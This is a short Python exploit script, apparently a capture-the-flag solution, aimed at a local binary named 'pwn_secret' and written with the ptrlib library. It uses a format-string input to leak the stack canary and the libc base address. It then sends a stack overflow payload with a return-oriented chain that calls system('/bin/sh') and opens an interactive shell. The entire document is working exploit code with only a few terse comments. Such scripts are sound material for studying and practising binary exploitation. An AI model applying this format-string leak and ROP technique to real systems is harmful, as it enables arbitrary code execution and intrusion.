from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./pwn_secret")
rop_pop_rdi = 0x0002155f
rop_ret = 0x000008aa

# libc leak
sock.sendlineafter("Name: ", "%15$p.%17$p")
sock.recvuntil("Hillo ")
l = sock.recvline().split(b".")
canary = int(l[0], 16)
libc_base = int(l[1], 16) - libc.symbol("__libc_start_main") - 0xe7
logger.info("canary = " + hex(canary))
logger.info("libc base = " + hex(libc_base))

# get the shell!
payload = b'A' * 0x88
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(libc_base + rop_ret)
payload += p64(libc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.search("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendlineafter("Phrase: ", payload)

sock.interactive()
